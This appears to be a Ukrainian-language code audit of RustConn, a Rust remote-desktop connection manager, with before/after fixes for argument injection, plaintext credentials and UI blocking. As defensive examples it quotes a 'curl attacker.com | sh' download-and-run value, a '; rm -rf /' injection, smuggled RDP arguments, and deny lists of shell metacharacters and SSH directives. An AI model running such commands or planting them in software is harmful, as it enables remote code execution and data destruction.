# RustConn — Глибокий аудит архітектури та коду

**Дата:** 19 лютого 2026
**Версія проєкту:** 0.8.9
**Аудитор:** Principal Rust Engineer / Linux Systems Architect

---

## 1. Executive Summary

RustConn — зрілий проєкт з продуманою трикрейтовою архітектурою та суворим
розділенням GUI/бізнес-логіки. Кодова база демонструє високу якість:
`thiserror` для всіх помилок, `clippy pedantic+nursery` на warn, `unsafe_code = "forbid"`,
розвинена тестова інфраструктура з ~100 property-тестів.

Однак аудит виявив **51 проблему**, з яких:
- **6 критичних** — ін'єкція команд через `custom_args` у протоколах
- **12 високих** — `block_on` на GTK main thread, credentials як plain `String`
- **18 середніх** — RefCell borrow panic ризики, `eprintln!` замість `tracing`
- **15 низьких** — рефакторинг, документація, deprecated API

**Головні системні проблеми:**
1. Відсутня валідація `custom_args` у всіх протоколах → command injection
2. Масове використання `block_on_async` у GUI → UI freeze на секунди
3. Credentials зберігаються як `String` замість `SecretString` у 5+ місцях

---

## 2. Уточнюючі питання (з відповідями)

1. **KDE Plasma / non-GNOME DE?** — Так, варто стандартизувати. `ksni` tray
   працює через D-Bus StatusNotifierItem, KDE також використовується.
2. **Threat model для імпортованих конфігурацій?** — Ні. Це десктопний додаток,
   відповідальність на користувачі. Проте базова санітизація `custom_args`
   залишається рекомендованою (defense in depth).
3. **Цільова latency для embedded RDP/VNC?** — Є фідбек по перформансу для RDP.
   Якщо не важко покращити Cairo fallback — варто. Розглянути unsafe helper crate
   для wl_subsurface.
4. **Міграція з `serde_yaml`?** — ✅ ВИКОНАНО. Мігровано на `serde_yaml_ng` 0.9
   (maintained fork, drop-in replacement). Cargo rename зберігає `serde_yaml::`
   у коді для мінімальних змін.
5. **`block_on_async` у GUI?** — Ні, можна асинхронно при старті. Синхронні
   операції допустимі тільки для резолвінгу credentials при встановленні з'єднання.

---

## 3. Компонент: Протоколи (`rustconn-core/src/protocol/`)

### Критичний


- [ ] **[Критичний] Ін'єкція через `custom_args` у VNC протоколі**
  - **Опис:** `vnc_config.custom_args` вставляється у вектор команди без жодної
    перевірки. Зловмисний імпортований конфіг може додати аргументи на кшталт
    `--via` або `-passwd` для перенаправлення з'єднання чи зчитування файлів.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/protocol/vnc.rs:~107
    args.extend(vnc_config.custom_args.clone());
    ```
  - **Як варто змінити (After):**
    ```rust
    for arg in &vnc_config.custom_args {
        if arg.contains('\0') || arg.contains('\n') {
            tracing::warn!(arg = %arg, "Skipping suspicious VNC custom arg");
            continue;
        }
        args.push(arg.clone());
    }
    ```

- [ ] **[Критичний] Ін'єкція через `custom_args` у RDP протоколі**
  - **Опис:** `rdp_config.custom_args` додаються без фільтрації. Зловмисник може
    вставити `/p:password` для перезапису пароля, `/proxy:` для перенаправлення
    трафіку, або `/shell:cmd.exe` для виконання довільних команд на сервері.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/protocol/rdp.rs:~145
    args.extend(rdp_config.custom_args.clone());
    ```
  - **Як варто змінити (After):**
    ```rust
    let dangerous_prefixes = ["/p:", "/password:", "/shell:", "/proxy:"];
    for arg in &rdp_config.custom_args {
        let lower = arg.to_lowercase();
        if dangerous_prefixes.iter().any(|p| lower.starts_with(p)) {
            tracing::warn!(arg = %arg, "Blocked dangerous RDP custom arg");
            continue;
        }
        args.push(arg.clone());
    }
    ```

- [ ] **[Критичний] Ін'єкція через `custom_args` та `device` у Serial протоколі**
  - **Опис:** `config.custom_args` та `config.device` вставляються без перевірки.
    Поле `device` може містити path traversal. Валідація перевіряє лише порожність,
    але не формат шляху.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/protocol/serial.rs:~95-96
    cmd.extend(config.custom_args.clone());
    cmd.push(config.device.clone());
    ```
  - **Як варто змінити (After):**
    ```rust
    if !config.device.starts_with("/dev/") {
        return None; // Тільки /dev/* пристрої
    }
    for arg in &config.custom_args {
        if arg.contains('\0') || arg.contains('\n') {
            continue;
        }
        cmd.push(arg.clone());
    }
    cmd.push(config.device.clone());
    ```

- [ ] **[Критичний] Ін'єкція через `shell`, `busybox_image`, `custom_args` у Kubernetes**
  - **Опис:** Поля `config.shell`, `config.busybox_image` та `config.custom_args`
    вставляються у команду `kubectl` без санітизації. Зловмисний `shell` на кшталт
    `/bin/sh -c "curl attacker.com | sh"` може призвести до виконання довільного коду.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/protocol/kubernetes.rs:~140
    cmd.push(config.shell.clone());
    ```
  - **Як варто змінити (After):**
    ```rust
    if config.shell.contains(' ') || config.shell.contains(';')
        || config.shell.contains('|') || config.shell.contains('&') {
        return None;
    }
    cmd.push(config.shell.clone());
    ```

- [ ] **[Критичний] Ін'єкція через `custom_args` у Telnet протоколі**
  - **Опис:** `config.custom_args` додаються без перевірки. `connection.host`
    також не валідується на спецсимволи.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/protocol/telnet.rs:~68
    cmd.extend(config.custom_args.clone());
    ```
  - **Як варто змінити (After):**
    ```rust
    for arg in &config.custom_args {
        if arg.contains('\0') || arg.contains('\n') || arg.contains(';') {
            tracing::warn!(arg = %arg, "Skipping suspicious Telnet custom arg");
            continue;
        }
        args.push(arg.clone());
    }
    ```

### Високий

- [ ] **[Високий] Пароль у відкритому вигляді в аргументах командного рядка FreeRDP**
  - **Опис:** `FreeRdpConfig.password` зберігається як `Option<String>` (не
    `SecretString`) і передається через `/p:{password}` в аргументах. Це видно
    через `/proc/PID/cmdline` будь-якому користувачу системи.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/protocol/freerdp.rs:~38, ~198
    pub password: Option<String>,
    // ...
    args.push(format!("/p:{password}"));
    ```
  - **Як варто змінити (After):**
    ```rust
    pub password: Option<SecretString>,
    // Передавати пароль через /from-stdin або змінну середовища
    if config.password.is_some() {
        args.push("/from-stdin".to_string());
    }
    ```

### Середній

- [ ] **[Середній] Відсутня валідація `proxy` поля у SPICE протоколі**
  - **Опис:** `spice_config.proxy` вставляється у `--spice-proxy=` без валідації
    формату. Може містити спецсимволи.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/protocol/spice.rs:~130
    if let Some(ref proxy) = spice_config.proxy {
        args.push(format!("--spice-proxy={proxy}"));
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    if let Some(ref proxy) = spice_config.proxy {
        if proxy.chars().all(|c| c.is_alphanumeric() || ".-:/@_".contains(c)) {
            args.push(format!("--spice-proxy={proxy}"));
        } else {
            tracing::warn!(proxy = %proxy, "Invalid SPICE proxy format");
        }
    }
    ```

- [ ] **[Середній] Відсутня валідація `shared_folders` шляхів у RDP**
  - **Опис:** `folder.local_path` та `folder.share_name` вставляються у `/drive:`
    аргумент без перевірки на path traversal або спецсимволи (коми, пробіли).
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/protocol/rdp.rs:~140
    for folder in &rdp_config.shared_folders {
        args.push(format!("/drive:{},{}", folder.share_name, folder.local_path.display()));
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    for folder in &rdp_config.shared_folders {
        if folder.share_name.contains(',') || folder.share_name.contains('/') {
            continue;
        }
        args.push(format!(
            "/drive:{},{}",
            folder.share_name,
            folder.local_path.display()
        ));
    }
    ```


---

## 4. Компонент: Автоматизація та змінні (`rustconn-core/src/automation/`, `variables/`)

### Критичний

- [ ] **[Критичний] Виконання команд через `sh -c` з недостатньою санітизацією**
  - **Опис:** `TaskExecutor::execute_command` передає підставлену команду в `sh -c`.
    `validate_command_value` перевіряє на null-байти та переноси рядків, але НЕ
    перевіряє на shell-метасимволи (`;`, `|`, `&&`, `` ` ``, `$()`). Змінна зі
    значенням `; rm -rf /` пройде валідацію та виконається.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/automation/tasks.rs:~470-471
    let mut cmd = Command::new("sh");
    cmd.arg("-c").arg(command);
    ```
  - **Як варто змінити (After):**
    ```rust
    // У variables/manager.rs — validate_command_value:
    const SHELL_META: &[char] = &[';', '|', '&', '`', '$', '(', ')', '<', '>'];
    if value.chars().any(|c| SHELL_META.contains(&c)) {
        return Err(VariableError::UnsafeValue {
            name: name.to_string(),
            reason: "contains shell metacharacters".to_string(),
        });
    }
    ```

### Високий

- [ ] **[Високий] `validate_command_value` не блокує shell-ін'єкцію**
  - **Опис:** `validate_command_value` перевіряє лише null-байти, переноси рядків
    та контрольні символи. Дозволяє `;`, `|`, `&`, `` ` ``, `$()` — все, що
    потрібно для shell-ін'єкції. Результат передається в `sh -c` (tasks.rs).
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/variables/manager.rs:~461-484
    fn validate_command_value(name: &str, value: &str) -> VariableResult<()> {
        if value.contains('\0') { /* ... */ }
        if value.contains('\n') || value.contains('\r') { /* ... */ }
        if value.chars().any(|c| c.is_control() && c != '\t') { /* ... */ }
        Ok(())
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    fn validate_command_value(name: &str, value: &str) -> VariableResult<()> {
        if value.contains('\0') { /* ... */ }
        if value.contains('\n') || value.contains('\r') { /* ... */ }
        if value.chars().any(|c| c.is_control() && c != '\t') { /* ... */ }

        const SHELL_META: &[char] = &[';', '|', '&', '`', '$', '(', ')', '<', '>', '!'];
        if value.chars().any(|c| SHELL_META.contains(&c)) {
            return Err(VariableError::UnsafeValue {
                name: name.to_string(),
                reason: "contains shell metacharacters".to_string(),
            });
        }
        Ok(())
    }
    ```

### Середній

- [ ] **[Середній] `unwrap()` на mutex lock у `TaskExecutor`**
  - **Опис:** `self.folder_tracker.lock().unwrap()` може спричинити паніку при
    отруєному м'ютексі.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/automation/tasks.rs:~524
    let mut tracker = self.folder_tracker.lock().unwrap();
    ```
  - **Як варто змінити (After):**
    ```rust
    let mut tracker = self.folder_tracker.lock()
        .unwrap_or_else(std::sync::PoisonError::into_inner);
    ```

### Низький

- [ ] **[Низький] Секретні змінні зберігаються як plain `String`**
  - **Опис:** `Variable.value` — це `String`, навіть коли `is_secret == true`.
    За правилами проєкту, секрети мають зберігатися як `SecretString`.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/variables/mod.rs:~38
    pub struct Variable {
        pub name: String,
        pub value: String,  // plain String навіть для секретів
        pub is_secret: bool,
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    pub struct Variable {
        pub name: String,
        pub value: String,
        pub is_secret: bool,
        // TODO: Для is_secret=true використовувати SecretString
        // або принаймні zeroize при Drop
    }
    ```

---

## 5. Компонент: Управління секретами (`rustconn-core/src/secret/`)

### Високий

- [ ] **[Високий] Відсутній ліміт розміру відповіді від KeePassXC сокета**
  - **Опис:** `response_len` зчитується з 4 байтів від сокета і використовується
    для алокації буфера без перевірки максимального розміру. Зловмисний або
    скомпрометований KeePassXC-сокет може надіслати `u32::MAX`, спричинивши OOM.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/secret/keepassxc.rs:~165-166
    let response_len = u32::from_ne_bytes(len_buf) as usize;
    let mut response_buf = vec![0u8; response_len];
    ```
  - **Як варто змінити (After):**
    ```rust
    const MAX_RESPONSE_SIZE: usize = 10 * 1024 * 1024; // 10 MB
    let response_len = u32::from_ne_bytes(len_buf) as usize;
    if response_len > MAX_RESPONSE_SIZE {
        return Err(SecretError::KeePassXC(
            format!("Response too large: {response_len} bytes")
        ));
    }
    let mut response_buf = vec![0u8; response_len];
    ```

- [ ] **[Високий] Пароль у відкритому вигляді в пам'яті при KeePassXC store**
  - **Опис:** При збереженні в KeePassXC, пароль витягується з `SecretString` і
    зберігається як звичайний `String`, який серіалізується в JSON. Цей `String`
    залишається в пам'яті і не зануляється.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/secret/keepassxc.rs:~248-249
    let password = credentials
        .expose_password()
        .unwrap_or_default()
        .to_string();  // plain String, не зануляється
    ```
  - **Як варто змінити (After):**
    ```rust
    // Мінімізувати час життя відкритого пароля
    let password_exposed = credentials.expose_password().unwrap_or_default();
    // Використовувати безпосередньо в серіалізації, без проміжного String
    ```

- [ ] **[Високий] Debug-залишки у production-коді secret модуля**
  - **Опис:** Рядок `tracing::debug!("DEBUG: Sending entry password")` містить
    зайвий префікс "DEBUG:" (tracing вже додає рівень). Це ознака залишеного
    debug-коду.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/secret/status.rs:~362
    tracing::debug!("DEBUG: Sending entry password");
    ```
  - **Як варто змінити (After):**
    ```rust
    tracing::debug!("Sending entry password to keepassxc-cli");
    ```

### Середній

- [ ] **[Середній] `associated` поле ніколи не оновлюється в KeePassXC backend**
  - **Опис:** `ensure_associated` перевіряє `self.associated`, але ніколи не
    встановлює його в `true` після успішної асоціації. Кожен виклик `store`/`retrieve`
    виконує зайвий `test-associate` запит.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/secret/keepassxc.rs:~189
    async fn ensure_associated(&self) -> SecretResult<()> {
        if self.associated {
            return Ok(());
        }
        // ... асоціація ...
        // self.associated ніколи не стає true
        Ok(())
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    // Використовувати AtomicBool для associated
    associated: std::sync::atomic::AtomicBool,
    // ...
    self.associated.store(true, std::sync::atomic::Ordering::Relaxed);
    ```

- [ ] **[Середній] `connection_id` не валідується перед передачею в `secret-tool`**
  - **Опис:** `connection_id` вставляється як аргумент `secret-tool` без валідації.
    Спецсимволи в `connection_id` можуть спричинити непередбачувану поведінку.


---

## 6. Компонент: Embedded клієнти (`vnc_client/`, `rdp_client/`, `ffi/`)

### Високий

- [ ] **[Високий] VNC пароль зберігається як plain `String`**
  - **Опис:** `VncClientConfig.password` зберігається як `Option<String>` замість
    `Option<SecretString>`. Порушує правило проєкту: "SecretString for all credentials".
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/vnc_client/config.rs:~22
    pub password: Option<String>,
    ```
  - **Як варто змінити (After):**
    ```rust
    use secrecy::SecretString;
    pub password: Option<SecretString>,
    ```

- [ ] **[Високий] RDP пароль зберігається як plain `String`**
  - **Опис:** `RdpClientConfig.password` зберігається як `Option<String>` замість
    `Option<SecretString>`. Порушує правило проєкту.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/rdp_client/config.rs
    pub password: Option<String>,
    ```
  - **Як варто змінити (After):**
    ```rust
    use secrecy::SecretString;
    pub password: Option<SecretString>,
    ```

- [ ] **[Високий] FFI VncDisplayState зберігає credentials як plain `String`**
  - **Опис:** Структура `VncDisplayState` зберігає VNC-паролі у
    `HashMap<VncCredentialType, String>`. Пароль залишається в пам'яті як
    звичайний `String` і може бути видимий у core dump.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/ffi/vnc.rs:~131
    struct VncDisplayState {
        credentials: std::collections::HashMap<VncCredentialType, String>,
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    use secrecy::SecretString;
    struct VncDisplayState {
        credentials: std::collections::HashMap<VncCredentialType, SecretString>,
    }
    ```

### Середній

- [ ] **[Середній] VNC клієнт підключається без TLS**
  - **Опис:** VNC-клієнт підключається через звичайний `TcpStream` без TLS.
    Пароль передається по незашифрованому каналу (VNC authentication використовує
    слабке DES-шифрування). Немає опції для VeNCrypt/TLS.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/vnc_client/client.rs:~237
    let tcp = TcpStream::connect(config.server_address()).await?;
    let mut connector = VncConnector::new(tcp) // plain TCP
    ```
  - **Як варто змінити (After):**
    ```rust
    // Додати підтримку TLS через tokio-rustls або VeNCrypt розширення
    // Як мінімум — документувати обмеження та додати warning
    tracing::warn!(
        host = %config.host,
        "VNC connection is unencrypted. Consider using SSH tunnel."
    );
    ```

- [ ] **[Середній] Копія пароля як `String` при IronRDP з'єднанні**
  - **Опис:** `config.password.clone().unwrap_or_default()` створює копію пароля
    як `String` при передачі в `Credentials::UsernamePassword`.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/rdp_client/client/connection.rs:~192
    config.password.clone().unwrap_or_default()
    ```
  - **Як варто змінити (After):**
    ```rust
    // Після міграції password на SecretString:
    use secrecy::ExposeSecret;
    config.password.as_ref()
        .map(|s| s.expose_secret().to_string())
        .unwrap_or_default()
    ```

### Низький

- [ ] **[Низький] `unwrap()` у `checked_sub` для VNC refresh interval**
  - **Опис:** `refresh_interval.checked_sub(time_since_refresh).unwrap()` може
    панікувати при race condition, хоча це малоймовірно.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/vnc_client/client.rs:~290
    refresh_interval.checked_sub(time_since_refresh).unwrap()
    ```
  - **Як варто змінити (After):**
    ```rust
    refresh_interval.checked_sub(time_since_refresh)
        .unwrap_or(refresh_interval)
    ```

---

## 7. Компонент: Імпорт/Експорт (`rustconn-core/src/import/`, `export/`)

### Середній

- [ ] **[Середній] Async `read_import_file_async` не перевіряє розмір файлу**
  - **Опис:** Синхронна версія `read_import_file` перевіряє розмір (50 MB ліміт),
    але асинхронна `read_import_file_async` — ні. Це може призвести до OOM при
    імпорті великого файлу.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/import/traits.rs:~74-82
    pub async fn read_import_file_async(
        path: &Path, source_name: &str,
    ) -> Result<String, ImportError> {
        tokio::fs::read_to_string(path).await.map_err(|e| /* ... */)
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    pub async fn read_import_file_async(
        path: &Path, source_name: &str,
    ) -> Result<String, ImportError> {
        let metadata = tokio::fs::metadata(path).await
            .map_err(|e| ImportError::ParseError {
                source_name: source_name.to_string(),
                reason: format!("Failed to read metadata: {e}"),
            })?;
        if metadata.len() > MAX_IMPORT_FILE_SIZE {
            return Err(ImportError::ParseError {
                source_name: source_name.to_string(),
                reason: format!("File too large: {} bytes", metadata.len()),
            });
        }
        tokio::fs::read_to_string(path).await.map_err(|e| /* ... */)
    }
    ```

- [ ] **[Середній] Потенційна ін'єкція через `custom_options` ключі в SSH config export**
  - **Опис:** `custom_options` ключі записуються в SSH config без валідації.
    Зловмисний ключ на кшталт `ProxyCommand` може виконати довільну команду при
    підключенні через згенерований конфіг.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/export/ssh_config.rs:~120-122
    for (key, value) in &ssh_config.custom_options {
        let escaped_value = escape_value(value);
        let _ = writeln!(output, "    {key} {escaped_value}");
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    const DANGEROUS_DIRECTIVES: &[&str] = &[
        "ProxyCommand", "LocalCommand", "PermitLocalCommand",
        "RemoteCommand", "Match",
    ];
    for (key, value) in &ssh_config.custom_options {
        if DANGEROUS_DIRECTIVES.iter().any(|d| key.eq_ignore_ascii_case(d)) {
            tracing::warn!(key = %key, "Skipping dangerous SSH config directive");
            continue;
        }
        let escaped_value = escape_value(value);
        let _ = writeln!(output, "    {key} {escaped_value}");
    }
    ```

### Низький

- [ ] **[Низький] `is_valid_hostname` занадто м'яка валідація**
  - **Опис:** Функція відхиляє лише `tmp`, `placeholder`, `none`, `localhost`.
    Будь-який інший рядок вважається валідним hostname, включаючи рядки зі
    спецсимволами.


---

## 8. Компонент: GTK↔Tokio міст та State Management (`rustconn/src/`)

### Високий

- [ ] **[Високий] `block_on_async` / `with_runtime` масово блокує GTK main loop**
  - **Опис:** `with_runtime(|rt| rt.block_on(...))` виконує `block_on` на GTK main
    thread, що повністю заморожує UI на час виконання async-операції. Використовується
    у ~30+ місцях: `state.rs` (credential resolution, flush_persistence,
    has_secret_backend), `dialogs/connection/dialog.rs` (test_connection),
    `dialogs/settings/secrets_tab.rs` (keyring operations). Мережеві операції
    (Bitwarden unlock, libsecret retrieve, KeePassXC proxy) можуть тривати секунди.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/state.rs:~822
    pub fn has_secret_backend(&self) -> bool {
        let secret_manager = self.secret_manager.clone();
        with_runtime(|rt| rt.block_on(async {
            secret_manager.is_available().await
        })).unwrap_or(false)
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    // Кешувати результат при ініціалізації
    pub fn has_secret_backend(&self) -> bool {
        self.secret_backend_available  // кешоване значення
    }

    // Для мережевих операцій — spawn_async з callback:
    spawn_async_with_callback(
        async move { secret_manager.is_available().await },
        move |available| { /* оновити UI */ },
    );
    ```

- [ ] **[Високий] `rename_vault_credential` блокує GTK thread синхронно**
  - **Опис:** `rename_vault_credential` — синхронна функція, яка всередині
    викликає `with_runtime(|rt| rt.block_on(...))` для мережевих операцій
    (Bitwarden retrieve+store+delete). Перейменування з'єднання з Bitwarden-бекендом
    може заморозити UI на 3-5 секунд.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/state.rs:~2988-3107
    pub fn rename_vault_credential(/* ... */) -> Result<(), String> {
        SecretBackendType::Bitwarden => crate::async_utils::with_runtime(|rt| {
            let backend = rt.block_on(/* ... */)?;
            let creds = rt.block_on(backend.retrieve(&old_key))?;
            rt.block_on(backend.store(&new_key, &creds))?;
            rt.block_on(backend.delete(&old_key))?;
            Ok(())
        })?,
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    // Перенести в async з callback
    pub fn rename_vault_credential_async(/* owned params */) {
        crate::async_utils::spawn_async(async move {
            // та сама логіка, але не блокує UI
            let result = do_rename(/* ... */).await;
            glib::idle_add_local_once(move || {
                if let Err(e) = result {
                    tracing::error!(%e, "Failed to rename vault credential");
                    show_toast("Failed to rename credential.");
                }
            });
        });
    }
    ```

- [ ] **[Високий] `resolve_credentials` блокує GTK thread**
  - **Опис:** Метод `resolve_credentials` використовує `with_runtime(|rt| rt.block_on(...))`
    для credential resolution. Хоча існує правильний `resolve_credentials_gtk`,
    старі синхронні методи все ще доступні і викликаються з GUI-коду.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/state.rs:~1028
    with_runtime(|rt| {
        rt.block_on(async {
            resolver.resolve(&connection, &groups).await
        })
    })
    ```
  - **Як варто змінити (After):**
    ```rust
    #[deprecated(note = "Use resolve_credentials_gtk for non-blocking resolution")]
    pub fn resolve_credentials(/* ... */) -> /* ... */ {
        // ...
    }
    ```

### Середній

- [ ] **[Середній] `EmbeddedRdpWidget` — масивна кількість `Rc<RefCell<>>` створює ризик borrow panic**
  - **Опис:** `EmbeddedRdpWidget` містить ~25 полів типу `Rc<RefCell<T>>`. У signal
    handlers ці RefCell-и запозичуються через `.borrow()` / `.borrow_mut()` без
    `try_borrow`. Якщо callback викликає інший callback, який запозичує той самий
    RefCell, відбудеться panic.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/embedded_rdp/mod.rs:~1453
    fn set_state(&self, new_state: RdpConnectionState) {
        *self.state.borrow_mut() = new_state;  // borrow_mut активний
        self.drawing_area.queue_draw();
        if let Some(ref callback) = *self.on_state_changed.borrow() {
            callback(new_state);  // callback може спробувати прочитати state
        }
    }
    ```
  - **Як варто змінити (After):**
    ```rust
    fn set_state(&self, new_state: RdpConnectionState) {
        *self.state.borrow_mut() = new_state;
        self.drawing_area.queue_draw();
        // Клонуємо callback, щоб звільнити borrow перед викликом
        let callback = self.on_state_changed.borrow().clone();
        if let Some(ref cb) = callback {
            cb(new_state);
        }
    }
    ```

- [ ] **[Середній] `QT_QPA_PLATFORM=xcb` порушує Wayland-first підхід**
  - **Опис:** `launch_freerdp` примусово встановлює `QT_QPA_PLATFORM=xcb` для
    FreeRDP subprocess. Це змушує wlfreerdp використовувати X11 backend через
    XWayland замість нативного Wayland. Суперечить Wayland-first стратегії проєкту.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/embedded_rdp/thread.rs:~405
    cmd.env("QT_LOGGING_RULES", "qt.qpa.wayland=false;qt.qpa.*=false");
    cmd.env("QT_QPA_PLATFORM", "xcb");
    ```
  - **Як варто змінити (After):**
    ```rust
    cmd.env("QT_LOGGING_RULES", "qt.qpa.wayland=false;qt.qpa.*=false");
    // НЕ встановлювати QT_QPA_PLATFORM — дозволити wlfreerdp
    // використовувати нативний Wayland backend
    ```

- [ ] **[Середній] VNC polling lock може блокувати GTK main thread**
  - **Опис:** VNC event polling timer (16мс інтервал, ~60 FPS) використовує
    `client.lock()` (std::sync::Mutex) на GTK main thread. Якщо VNC client thread
    тримає lock під час обробки мережевих даних, GTK main thread буде заблокований.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/embedded_vnc.rs:~1110-1120
    let client_guard = match client.lock() {
        Ok(guard) => guard,
        Err(_) => return glib::ControlFlow::Break,
    };
    ```
  - **Як варто змінити (After):**
    ```rust
    let client_guard = match client.try_lock() {
        Ok(guard) => guard,
        Err(std::sync::TryLockError::WouldBlock) => {
            return glib::ControlFlow::Continue; // skip this frame
        }
        Err(std::sync::TryLockError::Poisoned(_)) => {
            tracing::error!("[EmbeddedVNC] Client mutex poisoned");
            return glib::ControlFlow::Break;
        }
    };
    ```

- [ ] **[Середній] Event polling timer не зупиняється при disconnect**
  - **Опис:** GLib `timeout_add_local` polling loop для IronRDP подій продовжує
    працювати після disconnect, коли `client_ref.borrow()` повертає `None`.
  - **Як варто змінити (After):**
    ```rust
    // Додати на початку polling closure:
    if client_ref.borrow().is_none() {
        return glib::ControlFlow::Break;
    }
    ```


---

## 9. Компонент: Логування та Tracing

### Середній

- [ ] **[Середній] Масове використання `eprintln!` замість `tracing` у GUI-крейті**
  - **Опис:** Знайдено ~40+ використань `eprintln!` у GUI-крейті. Правила проєкту
    чітко забороняють `println!`/`eprintln!` для логування і вимагають `tracing`.
    Помилки з'єднань, збої збереження налаштувань та інші важливі події не
    потрапляють у structured logs.
  - **Як є зараз (Before):**
    ```rust
    // Множинні файли: window/mod.rs, window/sorting.rs, state.rs, app.rs
    eprintln!("RDP reconnect failed: {}", e);
    eprintln!("Failed to sort group: {e}");
    eprintln!("Failed to save settings: {e}");
    ```
  - **Як варто змінити (After):**
    ```rust
    tracing::error!(%e, "RDP reconnect failed");
    tracing::error!(%e, "Failed to sort group");
    tracing::error!(%e, "Failed to save settings");
    ```

- [ ] **[Середній] `show_toast_on_window` використовує `eprintln!` як fallback**
  - **Опис:** Коли `find_toast_overlay` не знаходить overlay, функція мовчки
    друкує в stderr через `eprintln!`. Порушує правило проєкту.
  - **Як є зараз (Before):**
    ```rust
    // rustconn/src/toast.rs:~182
    eprintln!("Toast (fallback): {}", message);
    ```
  - **Як варто змінити (After):**
    ```rust
    tracing::warn!(
        toast_message = message,
        "Could not find ToastOverlay in window hierarchy"
    );
    ```

- [ ] **[Середній] `field_names` містить `USERNAME` як стандартне поле для tracing**
  - **Опис:** Модуль `field_names` визначає `USERNAME` як стандартне поле для
    tracing spans. Якщо username логується разом з host/port, це створює PII-ризик
    у лог-файлах.
  - **Як варто змінити (After):**
    ```rust
    /// Username field
    /// WARNING: May contain PII. Use only at debug/trace level.
    pub const USERNAME: &str = "username";
    ```

---

## 10. Компонент: Workspace та залежності

### Середній

- [x] **[Середній] `serde_yaml` — deprecated та unmaintained** ✅ ВИКОНАНО
  - **Опис:** Крейт `serde_yaml` 0.9 офіційно deprecated з 25 березня 2024 року.
    Репозиторій заархівовано. Мігровано на `serde_yaml_ng` — maintained fork.
  - **Як було (Before):**
    ```toml
    # Cargo.toml
    serde_yaml = "0.9"
    ```
  - **Як стало (After):**
    ```toml
    # serde_yaml is deprecated; serde_yaml_ng is a maintained drop-in fork
    serde_yaml = { version = "0.9", package = "serde_yaml_ng" }
    ```

### Низький

- [ ] **[Низький] `tracing` та `tracing-subscriber` не в workspace dependencies**
  - **Опис:** `tracing` та `tracing-subscriber` використовуються у всіх трьох
    крейтах, але не винесені у `[workspace.dependencies]`. Може призвести до
    розбіжностей версій.
  - **Як є зараз (Before):**
    ```toml
    # У кожному крейті окремо:
    tracing = "0.1"
    tracing-subscriber = { version = "0.3", features = ["env-filter"] }
    ```
  - **Як варто змінити (After):**
    ```toml
    # У [workspace.dependencies]:
    tracing = "0.1"
    tracing-subscriber = { version = "0.3", features = ["env-filter"] }
    # У кожному крейті:
    tracing = { workspace = true }
    tracing-subscriber = { workspace = true }
    ```

- [ ] **[Низький] Deprecated flatpak-функції реекспортуються через `lib.rs`**
  - **Опис:** `lib.rs` реекспортує deprecated flatpak-функції з
    `#[allow(deprecated)]`. Ці функції не працюють з версії 0.7.7 (Flathub policy),
    їх реекспорт вводить в оману.
  - **Як є зараз (Before):**
    ```rust
    // rustconn-core/src/lib.rs:~97
    #[allow(deprecated)]
    pub use flatpak::{host_command, host_exec, host_has_command, host_spawn, host_which, is_flatpak};
    ```
  - **Як варто змінити (After):**
    ```rust
    pub use flatpak::is_flatpak;
    // Deprecated flatpak-spawn functions no longer re-exported.
    ```

- [ ] **[Низький] Надмірно великий публічний API surface через lib.rs**
  - **Опис:** `lib.rs` реекспортує понад 250 публічних символів напряму. Це
    створює плоский namespace та ускладнює навігацію. `SessionId` з `split`
    реекспортується як `SplitSessionId` — ознака конфлікту імен.
  - **Як варто змінити (After):**
    ```rust
    // Розглянути prelude-модуль або групування реекспортів
    pub mod prelude {
        pub use crate::models::*;
        pub use crate::error::*;
        // ...
    }
    ```

---

## 11. Компонент: Шифрування документів (`rustconn-core/src/document/`)

### Середній

- [ ] **[Середній] Неоднозначне визначення формату при дешифруванні**
  - **Опис:** Функція `decrypt_document` визначає формат (новий vs legacy) за
    значенням байта після magic header. Якщо перший байт salt випадково дорівнює
    0, 1 або 2, він буде помилково інтерпретований як strength byte нового формату.
  - **Як варто змінити (After):**
    ```rust
    // Додати версійний байт або окремий magic для нового формату
    // (наприклад, RCDB_EN2), щоб уникнути неоднозначності.
    // Це breaking change для формату, але усуне клас помилок.
    ```

---

## 12. Компонент: Tray та інші GUI-елементи

### Середній

- [ ] **[Середній] Непослідовна обробка poisoned mutex у tray**
